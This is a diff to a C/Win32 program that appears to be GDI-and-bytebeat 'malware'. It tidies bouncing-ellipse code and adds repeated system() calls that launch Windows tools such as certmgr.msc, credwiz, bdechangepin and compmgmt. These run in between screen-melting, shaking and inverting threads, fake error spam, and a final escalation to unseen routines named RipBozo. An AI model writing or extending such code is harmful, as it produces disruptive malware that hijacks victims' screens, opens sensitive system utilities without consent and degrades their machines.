@@ -346,25 +346,12 @@ DWORD WINAPI fun3(LPVOID lpVoid) { // https://github.com/pankoza2-pl/GDI-and-Byt
         HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
         SelectObject(hdc, brush);
         Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);
-        if (y >= GetSystemMetrics(SM_CYSCREEN))
-        {
-            signY = -1;
-        }
+        if (y >= GetSystemMetrics(SM_CYSCREEN)){signY = -1;}
+        if (x >= GetSystemMetrics(SM_CXSCREEN)){signX = -1;}
 
-        if (x >= GetSystemMetrics(SM_CXSCREEN))
-        {
-            signX = -1;
-        }
+        if (y == 0){signY = 1;}
+        if (x == 0){signX = 1;}
 
-        if (y == 0)
-        {
-            signY = 1;
-        }
-
-        if (x == 0)
-        {
-            signX = 1;
-        }
         Sleep(1);
         DeleteObject(brush);
         brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
@@ -2087,12 +2074,13 @@ void startPayloads() {
 	thread = CreateThread(0, 0, Cursors, 0, 0, &ID);
 	thread = CreateThread(0, 0, Melter, 0, 0, &ID);
 	thread = CreateThread(0, 0, fun1, 0, 0, &ID);
+    system("notepad");
     //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 	Bytebeat1();
 
 	Sleep(random() % 1500 + 1100);
-
+    system("write");
 	thread = CreateThread(0, 0, Melter, 0, 0, &ID);
 	thread = CreateThread(0, 0, Trails, 0, 0, &ID);
 	thread = CreateThread(0, 0, RGBCircle, 0, 0, &ID);
@@ -2112,6 +2100,7 @@ void startPayloads() {
 	thread = CreateThread(0, 0, Sinewave, 0, 0, &ID);
 	thread = CreateThread(0, 0, gdi17, 0, 0, &ID);
 	thread = CreateThread(0, 0, gdi18, 0, 0, &ID);
+    system("notepad");
     //thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
 	
 		
@@ -2119,6 +2108,7 @@ void startPayloads() {
 	
 
 	Sleep(random() % 10000 + 9000);
+    system("azman.msc");
 	thread = CreateThread(0, 0, Shake, 0, 0, &ID);
 	thread = CreateThread(0, 0, gdi19, 0, 0, &ID);
 	
@@ -2129,6 +2119,7 @@ void startPayloads() {
 	
 
 	Sleep(random() % 80000 + 7000);
+    system("bdechangepin");
 	thread = CreateThread(0, 0, Rotate, 0, 0, &ID);
 	thread = CreateThread(0, 0, Melter2, 0, 0, &ID);
 	thread = CreateThread(0, 0, fun3, 0, 0, &ID);
@@ -2143,6 +2134,7 @@ void startPayloads() {
 	Bytebeat3();
 
 	Sleep(random() % 10000 + 9000);
+    system("certmgr.msc");
 	thread = CreateThread(0, 0, Dark2, 0, 0, &ID);
 		
 	thread = CreateThread(0, 0, gdi5, 0, 0, &ID);
@@ -2151,6 +2143,7 @@ void startPayloads() {
 	
 
 	Sleep(random() % 4500 + 3200);
+    system("charmap");
 	thread = CreateThread(0, 0, Cubes, 0, 0, &ID);
 	thread = CreateThread(0, 0, fun4, 0, 0, &ID);
 		
@@ -2160,6 +2153,7 @@ void startPayloads() {
 	
 	
 	Sleep(random() % 24000 + 21000);
+    system("choice");
 	thread = CreateThread(0, 0, Rainbow, 0, 0, &ID);
 		
 	thread = CreateThread(0, 0, gdi7, 0, 0, &ID);
@@ -2168,6 +2162,7 @@ void startPayloads() {
 	
 
 	Sleep(random() % 4000 + 2700);
+    system("bdechangepin");
 	thread = CreateThread(0, 0, Flip, 0, 0, &ID);
 		
 	thread = CreateThread(0, 0, gdi8, 0, 0, &ID);
@@ -2176,6 +2171,7 @@ void startPayloads() {
 	
 
 	Sleep(random() % 7500 + 6400);
+    system("colorcpl");
 	thread = CreateThread(0, 0, Melter3, 0, 0, &ID);
 	thread = CreateThread(0, 0, Colors, 0, 0, &ID);
 	thread = CreateThread(0, 0, CircleSquare, 0, 0, &ID);
@@ -2192,6 +2188,7 @@ void startPayloads() {
 	Bytebeat4();
 
 	Sleep(random() % 20000 + 1800);
+    system("comexp.msc");
 	thread = CreateThread(0, 0, Bright, 0, 0, &ID);
 	thread = CreateThread(0, 0, ExtremeRotation, 0, 0, &ID);
 		
@@ -2203,6 +2200,7 @@ void startPayloads() {
 	Bytebeat5();
 
 	Sleep(random() % 17000 + 16000);
+    system("compmgmt");
 	thread = CreateThread(0, 0, Invert, 0, 0, &ID);
 		
 	thread = CreateThread(0, 0, gdi11, 0, 0, &ID);
@@ -2217,12 +2215,13 @@ void startPayloads() {
 	CloseHandle(thread);
 
 	Sleep(random() % 4000 + 3000);
+    system("ComputerDefaults");
 
     
     thread = CreateThread(0, 0, FakeErrorSpam, 0, 0, &ID);
     
     Sleep(random() % 4000 + 3000);
-
+    system("credwiz");
     // Here is when stuff gets a lil' bit stronger:
     Reset(); // stop bytebeat/""malware" music"
     RipBozo();
